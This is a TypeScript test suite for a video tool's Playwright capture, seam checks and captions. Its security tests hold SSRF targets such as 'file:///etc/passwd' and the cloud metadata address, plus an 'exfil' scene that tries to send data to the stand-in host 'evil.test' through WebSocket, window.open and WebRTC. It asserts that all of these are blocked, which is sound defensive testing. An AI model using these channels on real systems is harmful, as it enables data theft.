// PlaywrightCapture and PixelSeamService against the frame harness: agent frames, thumbnails, reference screenshots,
// timeouts, seams, and what scene code may reach from a capture page.
import assert from 'node:assert/strict';
import dgram from 'node:dgram';
import { mkdir, readdir, readFile, writeFile } from 'node:fs/promises';
import http from 'node:http';
import type { AddressInfo } from 'node:net';
import path from 'node:path';
import { setTimeout as sleep } from 'node:timers/promises';
import { after, before, describe, it } from 'node:test';
import { chromium } from 'playwright';
import { PNG } from 'pngjs';
import {
  CHROMIUM_ARGS,
  FrameTimeoutError,
  launchChromium,
  openFramePage,
  PlaywrightCapture,
  seekFrame,
} from '../../server/capture/capture';
import { PixelSeamService } from '../../server/capture/seams';
import { captureLocale } from '../../server/config';
import type { CaptureService } from '../../server/contracts';
import { HttpError } from '../../server/util';
import { FORMATS, SAFE_AREAS, type ProjectFile } from '../../src/shared/types';
import { near, pixel, RecordingHub, startHarness, type Harness } from './helpers/harness';

let h: Harness;
let capture: PlaywrightCapture;
let id: string;

before(async () => {
  h = await startHarness('capture');
  capture = new PlaywrightCapture({ config: h.config, store: h.store });
  id = await h.project('frames');
});

after(async () => {
  await capture?.close();
  await h?.close();
});

function size(image: Buffer, mime: string): { width: number; height: number } {
  if (mime === 'image/png') {
    const { width, height } = PNG.sync.read(image);
    return { width, height };
  }
  // JPEG: scan for the SOF0/SOF2 marker.
  for (let i = 2; i < image.length;) {
    const marker = image.readUInt16BE(i);
    if (marker === 0xffc0 || marker === 0xffc2) return { height: image.readUInt16BE(i + 5), width: image.readUInt16BE(i + 7) };
    i += 2 + image.readUInt16BE(i + 2);
  }
  throw new Error('not a JPEG');
}

async function updateProject(fn: (project: ProjectFile) => void, projectId = id): Promise<void> {
  const file = path.join(h.store.dir(projectId), 'project.json');
  const project = JSON.parse(await readFile(file, 'utf8')) as ProjectFile;
  fn(project);
  await writeFile(file, JSON.stringify(project, null, 2));
}

/** A fresh 16:9 copy of the fixture project whose scenes (1 s each) are replaced by these, in order. */
async function projectWith(scenes: Record<string, string>): Promise<string> {
  const projectId = await h.project('frames');
  for (const [sceneId, code] of Object.entries(scenes)) await writeFile(h.store.sceneFile(projectId, sceneId), code);
  await updateProject((p) => {
    p.formats = ['16:9'];
    p.scenes = Object.keys(scenes).map((sceneId) => ({ id: sceneId, name: sceneId, duration: 1 }));
  }, projectId);
  return projectId;
}

const fill = (css: string, inner = '') =>
  `export default function Scene() {\n  return <div style={{ position: 'absolute', inset: 0, ${css} }}>${inner}</div>;\n}\n`;

/** Canvas box of what differs from a white background (the caption box), or null when the frame is all white. */
function ink(png: Buffer, scale: number): { top: number; bottom: number; left: number; right: number } | null {
  const { width, height, data } = PNG.sync.read(png);
  let [top, bottom, left, right] = [Infinity, -1, Infinity, -1];
  for (let y = 0; y < height; y++) {
    for (let x = 0; x < width; x++) {
      const i = (y * width + x) * 4;
      if (Math.min(data[i], data[i + 1], data[i + 2]) > 240) continue;
      [top, bottom, left, right] = [Math.min(top, y), y, Math.min(left, x), Math.max(right, x)];
    }
  }
  return bottom < 0 ? null : { top: top / scale, bottom: (bottom + 1) / scale, left: left / scale, right: (right + 1) / scale };
}

describe('launchChromium', () => {
  it('leaves Ctrl+C, SIGTERM and a closed terminal to Cadence, which closes its browsers itself', async () => {
    const signals = ['SIGINT', 'SIGTERM', 'SIGHUP'] as const;
    const before = signals.map((signal) => process.listenerCount(signal));
    const browser = await launchChromium();
    try {
      assert.deepEqual(
        signals.map((signal) => process.listenerCount(signal)),
        before,
      );
    } finally {
      await browser.close();
    }
  });
});

describe('PlaywrightCapture.frames', () => {
  it('captures JPEGs for the agent at half size by default, PNGs on request', async () => {
    const frames = await capture.frames(id, { sceneId: 'red-blue', times: [0.25, 0.75] });
    assert.deepEqual(
      frames.map((f) => [f.t, f.sceneId, f.localTime, f.mime, f.errors.length]),
      [
        [0.25, 'red-blue', 0.25, 'image/jpeg', 0],
        [0.75, 'red-blue', 0.75, 'image/jpeg', 0],
      ],
    );
    assert.deepEqual(size(frames[0].image, frames[0].mime), { width: 960, height: 540 });

    const [png] = await capture.frames(id, {
      sceneId: 'red-blue',
      times: [0.75],
      imageFormat: 'png',
      scale: 0.25,
      format: '9:16',
    });
    assert.equal(png.mime, 'image/png');
    assert.deepEqual(size(png.image, png.mime), { width: 270, height: 480 });
    assert.ok(near(pixel(png.image, 100, 200), [0, 0, 255]));
  });

  it('captures the whole video by video time and reports scene errors', async () => {
    const frames = await capture.frames(id, { sceneId: null, times: [1.25, 4.9], imageFormat: 'png' });
    assert.deepEqual(
      frames.map((f) => [f.sceneId, f.localTime]),
      [
        ['blue', 0.25],
        ['throws', 0.9],
      ],
    );
    assert.equal(frames[0].errors.length, 0);
    assert.match(frames[1].errors[0], /Boum/);
  });

  it('rejects unknown scenes and formats', async () => {
    await assert.rejects(capture.frames(id, { sceneId: 'nope', times: [0] }), (e) => e instanceof HttpError && e.status === 404);
    await assert.rejects(
      capture.frames(id, { sceneId: null, times: [0], format: '2:1' as never }),
      (e) => e instanceof HttpError && e.status === 400,
    );
  });

  it('follows code changes between captures', async () => {
    const file = h.store.sceneFile(id, 'green');
    const before = await readFile(file, 'utf8');
    await writeFile(file, before.replace('#00ff00', '#ffff00'));
    // No explicit sync: frames() syncs the code itself, as right after an agent edit.
    const [frame] = await capture.frames(id, { sceneId: 'green', times: [0.1], imageFormat: 'png' });
    assert.ok(near(pixel(frame.image, 480, 270), [255, 255, 0]));
    await writeFile(file, before);
  });

  it('times out on a scene stuck in a loop and recovers with a fresh page', async () => {
    const fast = new PlaywrightCapture({ config: h.config, store: h.store, renderTimeoutMs: 1500 });
    const file = h.store.sceneFile(id, 'green');
    const original = await readFile(file, 'utf8');
    try {
      await writeFile(
        file,
        "export default function Green({ t }: { t: number }) {\n  while (t > 0.25) {}\n  return <div style={{ position: 'absolute', inset: 0, background: '#00ff00' }} />;\n}\n",
      );
      await assert.rejects(fast.frames(id, { sceneId: 'green', times: [0.4] }), FrameTimeoutError);
      const [frame] = await fast.frames(id, { sceneId: 'green', times: [0.1], imageFormat: 'png' });
      assert.ok(near(pixel(frame.image, 480, 270), [0, 255, 0]));
    } finally {
      await fast.close();
      await writeFile(file, original);
    }
  });

  it('refuses captures queued behind close() instead of launching a Chromium nobody closes', async () => {
    const closing = new PlaywrightCapture({ config: h.config, store: h.store });
    await closing.frames(id, { sceneId: 'green', times: [0.1] });
    // Another scale is another page: this one needs the browser after close() has started.
    const queued = assert.rejects(
      closing.frames(id, { sceneId: 'blue', times: [0.1], scale: 0.3 }),
      (e: unknown) => e instanceof HttpError && e.status === 503,
    );
    await closing.close();
    await queued;
    await assert.rejects(closing.frames(id, { sceneId: 'green', times: [0.1] }), HttpError);
  });

  it('freezes animated images, which would otherwise follow the wall clock', async () => {
    const svg = `<svg xmlns="http://www.w3.org/2000/svg" width="400" height="200"><rect width="400" height="200" fill="#fff"/><rect width="40" height="200" fill="#f00"><animate attributeName="x" from="0" to="4000" dur="10s" fill="freeze"/></rect></svg>`;
    const projectId = await projectWith({
      animated: `export default function Animated() {\n  return <img src=${JSON.stringify(`data:image/svg+xml,${encodeURIComponent(svg)}`)} style={{ width: 1920, height: 960 }} />;\n}\n`,
    });
    const shoot = async () =>
      (await capture.frames(projectId, { sceneId: 'animated', times: [0.5], imageFormat: 'png' }))[0].image;
    const first = await shoot();
    await sleep(400);
    assert.ok(first.equals(await shoot()), 'same t, same pixels');
    // Also launched with less raster reuse between frames (not measurable here: it only shows on some scenes).
    assert.ok(CHROMIUM_ARGS.includes('--disable-partial-raster'));
  });
});

describe('PlaywrightCapture.thumbnail', () => {
  it('renders a quarter-size JPEG once per generation and scene state', async () => {
    const first = await capture.thumbnail(id, 'blue', { t: 0.25 });
    assert.deepEqual(size(first, 'image/jpeg'), { width: 480, height: 270 });
    const dir = path.join(h.store.dir(id), '.cadence', 'thumbs');
    const names = (await readdir(dir)).filter((n) => n.startsWith('blue-16x9-0.25-'));
    assert.equal(names.length, 1);
    assert.match(names[0], new RegExp(`^blue-16x9-0\\.25-g[0-9a-f]{8}\\.${h.store.generation(id)}-[0-9a-f]{12}\\.jpg$`));
    assert.deepEqual(await capture.thumbnail(id, 'blue', { t: 0.25 }), first);

    // After a restart the code generation starts over: thumbnails of the previous run are never served again.
    const restarted = new PlaywrightCapture({ config: h.config, store: h.store });
    try {
      await restarted.thumbnail(id, 'blue', { t: 0.25 });
    } finally {
      await restarted.close();
    }
    const again = (await readdir(dir)).filter((n) => n.startsWith('blue-16x9-0.25-'));
    assert.equal(again.length, 1);
    assert.notEqual(again[0], names[0]);

    // A new duration is a new thumbnail, and the old one goes away.
    await updateProject((p) => (p.scenes.find((s) => s.id === 'blue')!.duration = 0.6));
    await capture.thumbnail(id, 'blue', { t: 0.25 });
    const after = (await readdir(dir)).filter((n) => n.startsWith('blue-16x9-0.25-'));
    assert.equal(after.length, 1);
    assert.notEqual(after[0], again[0]);
    await updateProject((p) => (p.scenes.find((s) => s.id === 'blue')!.duration = 0.5));
  });

  it('defaults to the middle of the scene', async () => {
    await capture.thumbnail(id, 'red-blue');
    assert.ok((await readdir(path.join(h.store.dir(id), '.cadence', 'thumbs'))).some((n) => n.startsWith('red-blue-16x9-0.5-')));
  });
});

describe('PlaywrightCapture.screenshotUrl', () => {
  it('screenshots http pages as desktop or mobile, and refuses anything else', async () => {
    const site = http.createServer((_req, res) => {
      res.setHeader('Content-Type', 'text/html');
      res.end('<body style="margin:0;background:#123456"><h1>Référence</h1></body>');
    });
    await new Promise<void>((resolve) => site.listen(0, '127.0.0.1', resolve));
    const url = `http://127.0.0.1:${(site.address() as AddressInfo).port}/`;
    try {
      const desktop = await capture.screenshotUrl(url, { device: 'desktop' });
      assert.deepEqual(size(desktop, 'image/png'), { width: 1440, height: 900 });
      assert.ok(near(pixel(desktop, 1400, 800), [0x12, 0x34, 0x56]));
      // 390 × 844 at 3×; a page without a viewport meta is zoomed out like on a phone, hence ± 1 px.
      const mobile = size(await capture.screenshotUrl(url, { device: 'mobile' }), 'image/png');
      assert.equal(mobile.width, 1170);
      assert.ok(Math.abs(mobile.height - 2532) <= 1, String(mobile.height));
    } finally {
      site.close();
    }
    for (const bad of ['file:///etc/passwd', 'javascript:alert(1)', 'pas une url', `${h.config.frameOrigin}/frame.html`]) {
      await assert.rejects(
        capture.screenshotUrl(bad, { device: 'desktop' }),
        (e) => e instanceof HttpError && e.status === 400,
        bad,
      );
    }
  });

  it('checks every hop: reserved addresses and Cadence itself are refused, even behind a redirect', async () => {
    // Link-local (cloud metadata), unspecified and multicast addresses, however they are written, and Cadence's ports
    // by name: refused before any request.
    for (const bad of [
      'http://169.254.169.254/latest/meta-data/',
      'http://[::ffff:169.254.169.254]/',
      'http://[fe80::1]/',
      'http://0.0.0.0/',
      'http://224.0.0.1/',
      `http://localhost:${h.config.editorPort}/`,
    ]) {
      await assert.rejects(
        capture.screenshotUrl(bad, { device: 'desktop' }),
        (e) => e instanceof HttpError && e.status === 400 && /réservée|elle-même/.test(e.message),
        bad,
      );
    }
    const square = `${h.config.frameOrigin}/@fs${h.store.dir(id)}/assets/square.svg`;
    const site = http.createServer((req, res) => {
      if (req.url === '/to-frame') {
        res.writeHead(302, { Location: `${h.config.frameOrigin}/frame.html?project=${id}&mode=capture` });
        return res.end();
      }
      res.setHeader('Content-Type', 'text/html');
      res.end(`<body style="margin:0;background:#123456"><img src="${square}" style="width:400px;height:400px"></body>`);
    });
    await new Promise<void>((resolve) => site.listen(0, '127.0.0.1', resolve));
    const url = `http://127.0.0.1:${(site.address() as AddressInfo).port}`;
    try {
      await assert.rejects(
        capture.screenshotUrl(`${url}/to-frame`, { device: 'desktop' }),
        (e) => e instanceof HttpError && e.status === 400 && /Cadence ne peut pas se capturer elle-même/.test(e.message),
      );
      // A page of an allowed site cannot pull pixels from Cadence either: the image is blocked, the capture goes on.
      const shot = await capture.screenshotUrl(`${url}/`, { device: 'desktop' });
      assert.ok(near(pixel(shot, 200, 200), [0x12, 0x34, 0x56]), 'no image from the frame origin');
    } finally {
      site.close();
    }
  });
});

describe('capture pages', () => {
  it('keep scene code from reaching anything but the frame origin, and render in the capture locale', async () => {
    const events: string[] = [];
    const catcher = http.createServer((req, res) => {
      events.push(`http ${req.url}`);
      res.end();
    });
    catcher.on('connection', () => events.push('tcp'));
    catcher.on('upgrade', (req, socket) => {
      events.push(`websocket ${req.url}`);
      socket.destroy();
    });
    await new Promise<void>((resolve) => catcher.listen(0, '127.0.0.1', resolve));
    const stun = dgram.createSocket('udp4');
    stun.on('message', () => events.push('udp'));
    await new Promise<void>((resolve) => stun.bind(0, '127.0.0.1', resolve));
    // evil.test stands for any host on the internet; here it leads to the catcher, so whatever gets out is seen.
    const out = `evil.test:${(catcher.address() as AddressInfo).port}`;
    const browser = await chromium.launch({ args: [...CHROMIUM_ARGS, '--host-resolver-rules=MAP evil.test 127.0.0.1'] });
    try {
      const projectId = await projectWith({
        exfil: `let started = false;
export default function Exfil() {
  if (!started) {
    started = true;
    window.open('http://${out}/open');
    setTimeout(() => (location.href = 'http://${out}/location'), 0);
    // A same-origin worker script has no CSP of its own.
    const beacon = new URL('../components/beacon.js', import.meta.url);
    new Worker(beacon);
    const pc = new RTCPeerConnection({
      iceServers: [
        { urls: 'stun:127.0.0.1:${stun.address().port}' },
        { urls: 'turn:${out}?transport=tcp', username: 'secret', credential: 'x' },
      ],
    });
    pc.createDataChannel('x');
    void pc.createOffer().then((offer) => pc.setLocalDescription(offer));
  }
  return <div style={{ position: 'absolute', inset: 0, background: '#00ff00' }}>{(25000).toLocaleString()}</div>;
}
`,
      });
      await mkdir(path.join(h.store.dir(projectId), 'components'), { recursive: true });
      await writeFile(path.join(h.store.dir(projectId), 'components', 'beacon.js'), `new WebSocket('ws://${out}/socket');\n`);
      await h.store.syncCode(projectId);

      const { context, page } = await openFramePage(browser, h.config.frameOrigin, {
        projectId,
        sceneId: 'exfil',
        format: '16:9',
        scale: 0.25,
      });
      try {
        await sleep(1500);
        assert.deepEqual((await seekFrame(page, 0.5)).errors, []);
        assert.ok(near(pixel(await page.screenshot({ type: 'png' }), 240, 135), [0, 255, 0]), 'the capture still works');
        assert.match(page.url(), /\/frame\.html\?/);
        assert.deepEqual(events, [], 'nothing left the page');
        const shown = await page.evaluate(() => [navigator.language, document.body.textContent?.trim()]);
        assert.deepEqual(shown, [captureLocale(), (25000).toLocaleString(captureLocale())], 'number formatting');
      } finally {
        await context.close();
      }
    } finally {
      await browser.close();
      catcher.close();
      stun.close();
    }
  });

  it('take their locale from CADENCE_LOCALE (fr-FR by default)', () => {
    const saved = process.env.CADENCE_LOCALE;
    try {
      delete process.env.CADENCE_LOCALE;
      assert.equal(captureLocale(), 'fr-FR');
      process.env.CADENCE_LOCALE = 'en-us';
      assert.equal(captureLocale(), 'en-US');
      process.env.CADENCE_LOCALE = 'fr_FR';
      assert.throws(() => captureLocale(), /CADENCE_LOCALE invalide : fr_FR/);
    } finally {
      if (saved === undefined) delete process.env.CADENCE_LOCALE;
      else process.env.CADENCE_LOCALE = saved;
    }
  });
});

describe('PixelSeamService', () => {
  it('measures cuts in every format, caches them per run, code and timing, persists and announces them', async () => {
    let calls = 0;
    const counting: CaptureService = {
      frames: (projectId, req) => {
        calls++;
        return capture.frames(projectId, req);
      },
      thumbnail: capture.thumbnail.bind(capture),
      screenshotUrl: capture.screenshotUrl.bind(capture),
      kitSheet: capture.kitSheet.bind(capture),
      contactSheet: capture.contactSheet.bind(capture),
      close: async () => undefined,
    };
    const hub = new RecordingHub();
    const seams = new PixelSeamService({ store: h.store, capture: counting, hub });

    // No format given: every format of the project (16:9 and 9:16).
    const results = await seams.check(id, { sceneId: 'blue' });
    assert.deepEqual(
      results.map((r) => [r.from, r.to, r.format]),
      [
        ['red-blue', 'blue', '16:9'],
        ['blue', 'green', '16:9'],
        ['red-blue', 'blue', '9:16'],
        ['blue', 'green', '9:16'],
      ],
    );
    assert.deepEqual(
      results.map((r) => (r.diffPercent > 99 ? 'cut' : r.diffPercent)),
      [0, 'cut', 0, 'cut'],
      'red-blue ends blue and blue starts blue; blue to green is a hard cut',
    );
    assert.equal(calls, 8);
    assert.deepEqual(hub.events.at(-1), { type: 'seams', projectId: id, results });
    assert.deepEqual(
      (await seams.check(id, { sceneId: 'blue', format: '9:16' })).map((r) => r.format),
      ['9:16', '9:16'],
    );

    // Unchanged: served from the cache.
    assert.deepEqual(await seams.check(id, { sceneId: 'blue' }), results);
    assert.equal(calls, 8);

    // Persisted for the next server start, which shows them but measures again: code generations start over at 0.
    const seamsFile = path.join(h.store.dir(id), '.cadence', 'seams.json');
    const saved = JSON.parse(await readFile(seamsFile, 'utf8'));
    assert.equal(saved.version, 2);
    assert.equal(Object.keys(saved.entries).length, 4);
    const restarted = new PixelSeamService({ store: h.store, capture: counting, hub });
    assert.deepEqual(restarted.cached(id), results);
    await restarted.check(id, { sceneId: 'blue' });
    assert.equal(calls, 16);
    // Results of the older half-size measure are dropped.
    await writeFile(seamsFile, JSON.stringify({ ...saved, version: 1 }));
    assert.deepEqual(new PixelSeamService({ store: h.store, capture: counting, hub }).cached(id), []);

    // A timing change invalidates the cuts around that scene.
    await updateProject((p) => (p.scenes.find((s) => s.id === 'blue')!.duration = 0.7));
    await seams.check(id, { sceneId: 'blue' });
    assert.equal(calls, 24);
    await updateProject((p) => (p.scenes.find((s) => s.id === 'blue')!.duration = 0.5));

    const detail = await seams.detail(id, 'blue', 'green');
    assert.ok(detail.result.diffPercent > 99);
    assert.deepEqual(
      [PNG.sync.read(detail.fromImage).width, PNG.sync.read(detail.toImage).width, PNG.sync.read(detail.diffImage).width],
      [1920, 1920, 1920],
    );
  });

  it('checks the cuts again once a burst of edits settles, not after each edit', async () => {
    const hub = new RecordingHub();
    const seams = new PixelSeamService({ store: h.store, capture, hub });
    const checks = () => hub.events.filter((event) => event.type === 'seams').length;
    seams.recheck(id);
    await sleep(1000);
    seams.recheck(id);
    await sleep(1000);
    assert.equal(checks(), 0, 'the first edit is 2 s old, but the second one came 1 s ago');
    for (let i = 0; i < 200 && checks() === 0; i++) await sleep(50);
    assert.equal(checks(), 1);
  });

  it('sees faint jumps: a dark background step and a 6 % overlay, while identical cuts stay at 0 %', async () => {
    const title = `<div style={{ position: 'absolute', left: 200, top: 400, fontSize: 120, fontWeight: 700 }}>Cadence</div>`;
    const projectId = await projectWith({
      'dark-a': fill("background: '#0a0a0a'"),
      'dark-b': fill("background: '#1f1f1f'"),
      title: fill("background: '#f5f5f5'", title),
      'title-again': fill("background: '#f5f5f5'", title),
      'title-overlay': fill(
        "background: '#f5f5f5'",
        `${title}<div style={{ position: 'absolute', inset: 0, background: 'rgba(0, 0, 0, 0.06)' }} />`,
      ),
    });
    const seams = new PixelSeamService({ store: h.store, capture, hub: new RecordingHub() });
    const diff = Object.fromEntries((await seams.check(projectId)).map((r) => [`${r.from} to ${r.to}`, r.diffPercent]));
    assert.ok(diff['dark-a to dark-b'] > 0.05, `#0a0a0a to #1f1f1f: ${diff['dark-a to dark-b']} %`);
    assert.equal(diff['title to title-again'], 0);
    assert.ok(diff['title-again to title-overlay'] > 0.05, `6 % overlay: ${diff['title-again to title-overlay']} %`);
  });
});

describe('burned-in captions', () => {
  const lines = [
    { sceneId: 'a', text: 'Un.', start: 0.2, end: 0.6 },
    { sceneId: 'b', text: 'Deux.', start: 1.2, end: 1.6 },
  ];

  /** Two white scenes of 1 s, in 16:9 and 9:16, with the two sentences above spoken. */
  async function spoken(captions: boolean): Promise<string> {
    const projectId = await projectWith({ a: fill("background: '#ffffff'"), b: fill("background: '#ffffff'") });
    await updateProject((p) => {
      p.formats = ['16:9', '9:16'];
      p.captions = captions;
    }, projectId);
    h.store.voiceOverLines.set(projectId, lines);
    return projectId;
  }

  it('draw the cue of the video time at the bottom of the safe area, centered, in 16:9 and 9:16', async () => {
    const projectId = await spoken(true);
    for (const format of ['16:9', '9:16'] as const) {
      const { width, height } = FORMATS[format];
      const safe = SAFE_AREAS[format];
      const shot = { format, scale: 0.5, imageFormat: 'png' as const };
      const frames = await capture.frames(projectId, { ...shot, sceneId: null, times: [0.4, 0.9, 1.4, 0.4] });
      const [un, between, deux, again] = frames.map((f) => ink(f.image, 0.5));
      for (const box of [un, deux]) {
        assert.ok(box, `${format}: a caption while a sentence is said`);
        const where = `${format}: ${JSON.stringify(box)}`;
        assert.ok(box.bottom <= height - safe.bottom + 1 && box.bottom >= height - safe.bottom - 4, where);
        assert.ok(box.top >= height / 2, where);
        assert.ok(box.left >= safe.left && box.right <= width - safe.right, where);
        assert.ok(Math.abs((box.left + box.right) / 2 - width / 2) <= 2, where);
      }
      assert.ok(deux!.right - deux!.left > un!.right - un!.left, `${format}: "Deux." is wider than "Un."`);
      assert.equal(between, null, `${format}: nothing between two sentences`);
      assert.deepEqual(again, un, `${format}: the same time draws the same caption`);
      assert.deepEqual(frames[3].image, frames[0].image);

      // A scene's frames show the cue of the video time: 0.3 s into b is 1.3 s.
      const [scene] = await capture.frames(projectId, { ...shot, sceneId: 'b', times: [0.3] });
      assert.deepEqual(ink(scene.image, 0.5), deux);
    }

    const [off] = await capture.frames(await spoken(false), { sceneId: null, times: [0.4], scale: 0.5, imageFormat: 'png' });
    assert.equal(ink(off.image, 0.5), null, 'nothing when captions are off');
  });

  it('fit a long sentence on two lines at most, in the brand body font, in every format', async () => {
    // Cut into cues of nearly maxChars in every format (81 and 77 characters at 84): the widest a cue gets.
    const text =
      "Cadence anime chaque scène au rythme de la musique puis la voix off raconte toute l'histoire pendant que les " +
      'sous-titres défilent en bas sans couvrir le cadre.';
    const projectId = await projectWith({ a: fill("background: '#ffffff'"), b: fill("background: '#ffffff'") });
    await updateProject((p) => {
      p.captions = true;
    }, projectId);
    h.store.voiceOverLines.set(projectId, [{ sceneId: 'a', text, start: 0, end: 2 }]);
    const browser = await launchChromium();
    try {
      for (const format of ['16:9', '9:16', '1:1', '4:5'] as const) {
        const { page } = await openFramePage(browser, h.config.frameOrigin, { projectId, sceneId: null, format, scale: 0.25 });
        const shown: string[] = [];
        for (let t = 0.05; t < 2; t += 0.1) {
          await seekFrame(page, t);
          const caption = await page.evaluate(() => {
            const box = document.querySelector<HTMLElement>('[data-cadence-captions]')!;
            const style = getComputedStyle(box);
            const lines = box.clientHeight / parseFloat(style.lineHeight);
            const stage = getComputedStyle(document.querySelector('[data-cadence-stage]')!);
            return { text: box.textContent!, lines, font: style.fontFamily, stageFont: stage.fontFamily };
          });
          assert.ok(caption.lines <= 2.01, `${format}: "${caption.text}" on ${caption.lines} lines`);
          assert.equal(caption.font, caption.stageFont);
          if (shown.at(-1) !== caption.text) shown.push(caption.text);
        }
        assert.ok(shown.length > 1, `${format}: the sentence splits into several cues`);
        assert.equal(shown.join(' '), text, format);
      }
    } finally {
      await browser.close();
    }
  });

  it('keep a cue of one long unbroken word inside the safe area, in every format', async () => {
    // As long as a cue gets (maxChars 84 in landscape, 42 in portrait, 48 in square), with no space to wrap at.
    const longest = { landscape: 84, portrait: 42, square: 48 };
    const projectId = await projectWith({ a: fill("background: '#ffffff'"), b: fill("background: '#ffffff'") });
    await updateProject((p) => (p.captions = true), projectId);
    for (const format of ['16:9', '9:16', '1:1', '4:5'] as const) {
      const { width, orientation } = FORMATS[format];
      const safe = SAFE_AREAS[format];
      const word = 'anticonstitutionnellement'.repeat(4).slice(0, longest[orientation]);
      h.store.voiceOverLines.set(projectId, [{ sceneId: 'a', text: word, start: 0, end: 1 }]);
      const [frame] = await capture.frames(projectId, { sceneId: null, times: [0.5], format, scale: 0.5, imageFormat: 'png' });
      const box = ink(frame.image, 0.5);
      assert.ok(box && box.left >= safe.left && box.right <= width - safe.right, `${format}: ${JSON.stringify(box)}`);
    }
  });

  it('stay above a scene that stacks its own layers with z-index', async () => {
    const layer = "<div style={{ position: 'absolute', inset: 0, zIndex: 1, background: '#ffffff' }} />";
    const projectId = await projectWith({ a: fill("background: '#ffffff'", layer), b: fill("background: '#ffffff'") });
    await updateProject((p) => (p.captions = true), projectId);
    h.store.voiceOverLines.set(projectId, lines);
    const [frame] = await capture.frames(projectId, { sceneId: null, times: [0.4], scale: 0.5, imageFormat: 'png' });
    assert.ok(ink(frame.image, 0.5), 'the caption shows over a layer at z-index 1');
  });

  it('stay drawn over a scene that throws: they sit outside its error boundary', async () => {
    const projectId = await spoken(true);
    await writeFile(
      h.store.sceneFile(projectId, 'a'),
      "export default function A({ t }: { t: number }) {\n  if (t > 0.3) throw new Error('Boum');\n  return null;\n}\n",
    );
    await h.store.syncCode(projectId);
    const browser = await launchChromium();
    try {
      const { page } = await openFramePage(browser, h.config.frameOrigin, {
        projectId,
        sceneId: null,
        format: '16:9',
        scale: 0.5,
      });
      const caption = () => page.evaluate(() => document.querySelector('[data-cadence-captions]')?.textContent ?? null);
      assert.deepEqual((await seekFrame(page, 0.25)).errors, []);
      assert.equal(await caption(), 'Un.');
      assert.match((await seekFrame(page, 0.5)).errors[0], /Boum/);
      assert.equal(await caption(), 'Un.');
      await seekFrame(page, 0.9);
      assert.equal(await caption(), null);
    } finally {
      await browser.close();
    }
  });

  it('stay out of seam checks and thumbnails, even next to a page that draws them', async () => {
    // A hard cut with a sentence on screen across it: drawn on both sides, the caption would hide part of the jump.
    const projectId = await projectWith({ a: fill("background: '#ffffff'"), b: fill("background: '#f5f5f5'") });
    const plain = await projectWith({ a: fill("background: '#ffffff'"), b: fill("background: '#f5f5f5'") });
    const across = [{ sceneId: 'a', text: 'Bonjour tout le monde.', start: 0.5, end: 1.5 }];
    h.store.voiceOverLines.set(projectId, across);
    h.store.voiceOverLines.set(plain, across);
    const [without] = await new PixelSeamService({ store: h.store, capture, hub: new RecordingHub() }).check(projectId);
    assert.ok(without.diffPercent > 99, `white to #f5f5f5 is a hard cut: ${without.diffPercent} %`);

    await updateProject((p) => (p.captions = true), projectId);
    // The agent's frames at the seam scale draw it at the cut, from a page of their own.
    const [cut] = await capture.frames(projectId, { sceneId: 'a', times: [1], format: '16:9', scale: 1, imageFormat: 'png' });
    assert.ok(ink(cut.image, 1));
    const [withCaptions] = await new PixelSeamService({ store: h.store, capture, hub: new RecordingHub() }).check(projectId);
    assert.equal(withCaptions.diffPercent, without.diffPercent);

    assert.deepEqual(await capture.thumbnail(projectId, 'a', { t: 0.8 }), await capture.thumbnail(plain, 'a', { t: 0.8 }));
  });
});
